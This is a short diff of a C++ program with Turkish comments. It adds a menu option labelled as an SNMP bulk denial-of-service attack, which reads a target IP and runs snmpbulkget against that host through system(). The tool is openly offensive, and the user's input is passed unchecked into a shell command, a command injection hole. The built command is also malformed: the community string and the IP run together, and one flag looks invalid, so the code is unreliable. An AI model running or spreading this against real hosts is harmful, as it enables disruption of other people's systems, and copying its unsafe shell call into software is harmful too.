@@ -9,6 +9,7 @@ void program();
 void cikisKontrol(int);
 void enumIslem();
 void smbIslem();
+void snmpIslem();
 
 
 int main(){
@@ -67,6 +68,7 @@ void islem (int a){
 			break;
 		case 4:
 			//SNMP Bulk DOS Saldırısı
+			snmpIslem();
 			break;
 		default:
 			cout<<"Hatalı Giriş Yaptınız! - ";
@@ -98,5 +100,18 @@ void smbIslem(){
 	char komutSmb_C[smbSayi + 1];
 	strcpy(komutSmb_C, komutSmb_S.c_str());
 	system(komutSmb_C);
+	
+}
+
+void snmpIslem(){
+	
+	string snmpHedefIP;
+	cout<<"Hedef IP'yi girin:  ";
+	cin>>snmpHedefIP;
+	string komutSnmp_S = "snmpbulkget -v2c -0s -c public" + snmpHedefIP;
+	int snmpSayi = komutSnmp_S.length();
+	char komutSnmp_C[snmpSayi + 1];
+	strcpy(komutSnmp_C, komutSnmp_S.c_str());
+	system(komutSnmp_C);
 	
 }
